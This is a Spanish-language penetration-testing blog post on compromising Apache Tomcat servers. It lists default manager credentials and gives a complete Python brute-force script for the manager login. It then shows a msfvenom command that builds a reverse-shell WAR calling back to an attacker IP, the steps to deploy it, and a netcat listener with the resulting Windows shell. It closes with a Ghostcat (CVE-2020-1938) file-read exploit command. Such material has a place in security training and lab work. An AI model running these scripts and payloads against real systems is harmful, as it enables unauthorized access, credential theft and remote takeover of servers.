---
date: 2022-10-29T00:20:05.000Z
layout: post
comments: true
title: Tomcat Hacking
subtitle: 'WAR file'
description: >-
image: >-
    /images/tomcatlogo.png
optimized_image: >-
    /images/tomcatlogo.png
category: ciberseguridad
tags: 
  - hacking
  - war
  - default
  - credentials
  - apache
  - Ghostcat
author: Felipe Canales Cayuqueo
paginate: true
---


Apache Tomcat es un servidor web de código abierto y contenedor de Servlet para código Java. Una de las formas para la detección de la versión es buscando un directorio inexistente, de esta forma la respuesta podría ser como la siguiente:

[![tomcat1](/images/tomcat1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat1.png)

También es posible obtener la versión visitando el directorio ```/docs/```.

[![tomcat2](/images/tomcat2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat2.png)

### Credenciales por defecto

Un directorio importante en tomcat es el "manager app" presente en ```/manager``` o ```/host-manager```, el cual muchas veces contiene alguna de las siguientes credenciales:

|Username     |Password  |
|-------------|----------|
|admin        |password  |
|admin        |<blank>   |
|admin        |Password1 |
|admin        |password1 |
|admin        |admin     |
|admin        |tomcat    |
|both         |tomcat    |
|manager      |manager   |
|role1        |role1     |
|role1        |tomcat    |
|role         |changethis|
|root         |Password1 |
|root         |changethis|
|root         |password  |
|root         |password1 |
|root         |r00t      |
|root         |root      |
|root         |toor      |
|tomcat       |tomcat    |
|tomcat       |s3cret    |
|tomcat       |password1 |
|tomcat       |password  |
|tomcat       |<blank>   |
|tomcat       |admin     |
|tomcat       |changethis|

### Fuerza Bruta

Si no se encuentra la credencial se podría realizar fuerza bruta sobre el panel de login por medio del siguiente script en python:

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

El modo de uso es el siguiente:

```bash
┌──(root㉿kali)-[/tomcat]
└─ python3 mgr_brute.py -U <dirección web> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

### Ejecución remota de código con archivo WAR

Si ya obtuvimos acceso al "manager app", debemos crear nuestro payload por medio de ```msfvenom```:

```bash
┌──(root㉿kali)-[/tomcat]
└─ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=443 -f war -o reverse.war                                       
Payload size: 1085 bytes
Final size of war file: 1085 bytes
Saved as: reverse.war
```

```bash
┌──(root㉿kali)-[/tomcat]
└─ ls
reverse.war
```

Ahora dentro del "manager app" nos dirigimos a la sección "archivo WAR a desplegar" y le damos en "Choose File":

[![tomcat](/images/tomcat.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat.png)

Y seleccionamos el archivo ```reverse.war``` para desplegar:

[![tomcatwarupload](/images/tomcatwarupload.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcatwarupload.png)

Nos ponemos a la escucha con ```netcat``` en el puerto 443:

```bash
┌──(root㉿kali)-[/tomcat]
└─ nc -nlvp 443
listening on [any] 443 ...
```

Y abrimos ```/reverse``` en la tabla de aplicaciones de Tomcat:

[![tomcatreversewar](/images/tomcatreversewar.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcatreversewar.png)

Para finalmente obtenemos nuestra shell interactiva:

```bash
┌──(root㉿kali)-[/tomcat]
└─ nc -nlvp 443
listening on [any] 443 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49811
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
```

### CVE-2020-1938 (LFI)

[Ghostcat](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) es una vulnerabilidad sin autenticación que permite devolver archivos arbitrarios desde cualquier lugar de la aplicación web, es decir un (LFI). Todas las versiones de Tomcat anteriores a 9.0.31, 8.5.51 y 7.0.100 son vulnerables.

Dentro de las carpetas del servidor web hay ciertos archivos que son interesantes y se podrían aprovechar de visitar al explotar esta vulnerabilidad:

* tomcat-users.xml: Almacena las credenciales del usuario y sus roles asignados.
* WEB-INF/web.xml: Almacena información sobre las rutas utilizadas por la aplicación y las clases que manejan estas rutas.
* WEB-INF/classes: Pueden contener lógica empresarial importante, así como información confidencial.

Uso del exploit considerando de que el puerto debe ser el de Apache Jserv (ajp13) no el http.

> Para obtener el exploit se debe hacer click donde dice Ghostcat.

```bash
┌──(root㉿kali)-[/tomcat]
└─ python2 TomcatLFI.py <url> -p 8009 -f WEB-INF/web.xml
```

